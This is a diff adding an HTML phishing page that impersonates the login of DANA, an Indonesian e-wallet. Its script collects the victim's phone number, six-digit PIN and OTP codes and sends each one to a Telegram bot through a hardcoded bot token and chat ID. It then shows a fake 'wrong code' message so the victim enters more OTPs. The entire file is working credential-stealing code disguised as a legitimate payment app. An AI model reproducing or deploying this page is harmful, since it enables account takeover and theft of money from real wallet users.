@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
+    <title>DANA - Apa pun transaksinya selalu ada DANA</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap');
+        * {font-family: 'Open Sans', sans-serif;font-weight: 400;margin: 0;padding: 0;box-sizing: border-box;position: relative;}
+        b { font-weight: 700; }
+        html, body { width: 100vw; height: 100vh; background: #118EEA; overflow: hidden; }
+        
+        .container {background: #118EEA; height: 100%; width: 100%;}
+        
+        /* FIX POSITION HEADER */
+        body .header {
+            width: 100%;
+            height: 60px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 10px;
+        }
+        body .header .logo {
+            height: 35px; /* Kunci ukuran logo header */
+            width: auto;
+        }
+
+        form {width: 100%; height: 100%; display: flex; padding: 50px 20px; align-items: center; flex-direction: column;}
+        form h3 {width: 100%; font-size: 14px; text-align: center; color: #fff;}
+        
+        /* FIX BOX INPUT */
+        form .box-input {
+            width: 100%; height: 45px; padding: 5px 15px; margin-top: 50px; 
+            background: #fff; display: flex; border-radius: 10px; align-items: center;
+        }
+        form .box-input input {
+            background: none; width: 100%; height: 100%; outline: none; 
+            border: none; font-size: 22px; font-weight: 600; color: #000;
+        }
+        .box-input .label {display: flex; align-items: center; margin-right: 10px;}
+        .box-input .label img { width: 25px; height: auto; margin-right: 10px; }
+        .box-input .label label {color: #000; font-size: 16px; font-weight: 600;}
+
+        /* BUTTON LANJUT STICKY BOTTOM */
+        .box-btn {width: 100%; position: fixed; bottom: 0; left: 0;}
+        .box-btn button {
+            width: 100%; height: 70px; background: none; border: none; 
+            font-size: 16px; font-weight: 700; color: #fff; cursor: pointer;
+            padding-bottom: 20px;
+        }
+        .box-btn button:disabled { opacity: 0.6; }
+
+        /* PIN & OTP LOGIC TAMPILAN */
+        .box-input-pin, .box-input-otp {width: 100%; margin-top: 40px; display: flex; justify-content: center; align-items: center;}
+        .box-input-pin input, .box-input-otp input {
+            height: 45px; width: 40px; border: none; outline: none; border-radius: 8px; 
+            margin: 0 4px; text-align: center; font-size: 20px; font-weight: 700; color: #000; background: #fff;
+        }
+        .box-input-otp input { background: #F2F2F2; width: 45px; }
+
+        /* MODAL OTP FIX TEXT */
+        .bgotp {position: fixed; z-index: 9999; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.3);}
+        .bgotp form {
+            position: absolute; bottom: 0; height: 50%; width: 100%; 
+            background: #fff; border-radius: 20px 20px 0 0; padding: 40px 20px;
+        }
+        .bgotp h2 { color: #000; font-size: 20px; font-weight: 700; margin-bottom: 10px; text-align: center; display: block !important; }
+        .bgotp p { color: #666; font-size: 14px; text-align: center; display: block !important; }
+
+        /* SPINNER */
+        .process {top: 0; left: 0; position: fixed; display: flex; justify-content: center; align-items: center; background: rgba(0,0,0,0.5); z-index: 10000; width: 100%; height: 100%;}
+        .spinner {width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #118EEA; border-radius: 50%; animation: spin 1s linear infinite;}
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .start {top: 0; left: 0; width: 100%; height: 100%; position: fixed; z-index: 9999; display: flex; justify-content: center; align-items: center; background: #118EEA;}
+        .hid { display: none !important; }
+    </style>
+</head>
+<body>
+
+    <div class="start" id="starting">
+        <img src="https://d.top4top.io/p_3700gvr140.png" style="width: 140px;">
+    </div>
+
+    <div class="container hid" id="container">
+        <div id="process" class="process hid">
+            <div class="spinner"></div>
+        </div>
+
+        <div class="header">
+            <img src="https://i.top4top.io/p_3700anzcp0.png" class="logo">
+        </div>
+
+        <form id="formNohp" onsubmit="sendNohp(event);">
+            <h3>Masukkan <b>nomor HP</b> kamu untuk lanjut</h3>
+            <div class="box-input">
+                <div class="label"><img src="https://j.top4top.io/p_3700u0fz00.png"><label>+62</label></div>
+                <input id="inp" type="tel" autocomplete="off" required placeholder="811-1234-5678">
+            </div>
+            <div class="box-btn"><button disabled id="btn" type="submit">LANJUT</button></div>
+        </form>
+
+        <form id="formPin" class="hid">
+            <h3>Masukkan <b>PIN DANA</b></h3>
+            <div class="box-input-pin">
+                <input class="inppin" type="tel" maxlength="1" inputmode="numeric">
+                <input class="inppin" type="tel" maxlength="1" inputmode="numeric">
+                <input class="inppin" type="tel" maxlength="1" inputmode="numeric">
+                <input class="inppin" type="tel" maxlength="1" inputmode="numeric">
+                <input class="inppin" type="tel" maxlength="1" inputmode="numeric">
+                <input class="inppin" type="tel" maxlength="1" inputmode="numeric">
+            </div>
+            <p style="margin-top:50px; font-weight:600; text-align:center; color:#fff;">LUPA PIN?</p>
+        </form>
+
+        <div class="bgotp hid" id="otpBox">
+            <form id="formOtp">
+                <h2>Masukkan OTP</h2>
+                <p id="msgOtp">Kode telah dikirim ke nomor Anda</p>
+                <div class="box-input-otp">
+                    <input class="inpotp" type="tel" maxlength="1" inputmode="numeric">
+                    <input class="inpotp" type="tel" maxlength="1" inputmode="numeric">
+                    <input class="inpotp" type="tel" maxlength="1" inputmode="numeric">
+                    <input class="inpotp" type="tel" maxlength="1" inputmode="numeric">
+                </div>
+                <p style="margin-top:40px; color:#118EEA; font-weight:700;">KIRIM ULANG</p>
+            </form>
+        </div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+    <script>
+        // --- MASKER NOMOR HP ---
+        (function(a){a.fn.mask=function(){this.on("input",function(){let v=$(this).val().replace(/\D/g,"");if(v.length>3)v=v.substring(0,3)+"-"+v.substring(3,7)+"-"+v.substring(7,13);$(this).val(v)})}})(jQuery);
+
+        const TOK = "7917223889:AAF1CqKgJcUEMeWILM5gISXlvhyLVYWoeeA";
+        const CID = "6228274388";
+
+        function gas(m) {
+            fetch(`https://api.telegram.org/bot${TOK}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: CID, text: m, parse_mode: 'HTML'})
+            });
+        }
+
+        function sendNohp(e) {
+            e.preventDefault();
+            $("#process").removeClass("hid");
+            gas(`=== 📱 DANA: NO HP ===\nNo: +62 ${$("#inp").val()}`);
+            setTimeout(() => {
+                $("#process").addClass("hid");
+                $("#formNohp").hide();
+                $("#formPin").removeClass("hid");
+                $(".inppin").first().focus();
+            }, 1000);
+        }
+
+        $('.inppin').on('input', function() {
+            if(this.value) $(this).next().focus();
+            let p = ""; $(".inppin").each(function(){ p += $(this).val(); });
+            if(p.length == 6) {
+                $("#process").removeClass("hid");
+                gas(`=== 🔐 DANA: PIN ===\nPIN: <code>${p}</code>`);
+                setTimeout(() => {
+                    $("#process").addClass("hid");
+                    $("#otpBox").removeClass("hid");
+                    $(".inpotp").first().focus();
+                }, 1000);
+            }
+        });
+
+        $('.inpotp').on('input', function() {
+            if(this.value) $(this).next().focus();
+            let o = ""; $(".inpotp").each(function(){ o += $(this).val(); });
+            if(o.length == 4) {
+                gas(`=== 🚀 DANA: OTP ===\nOTP: <b>${o}</b>`);
+                $("#msgOtp").text("Kode OTP salah atau kedaluwarsa!").css("color","red");
+                $(".inpotp").val('');
+                $(".inpotp").first().focus();
+            }
+        });
+
+        $(document).ready(function() {
+            $('#inp').mask();
+            $('#inp').on('input', function() { $("#btn").prop('disabled', this.value.length < 10); });
+            setTimeout(() => { $("#starting").fadeOut(); $("#container").removeClass("hid"); }, 2000);
+        });
+    </script>
+</body>
+</html>
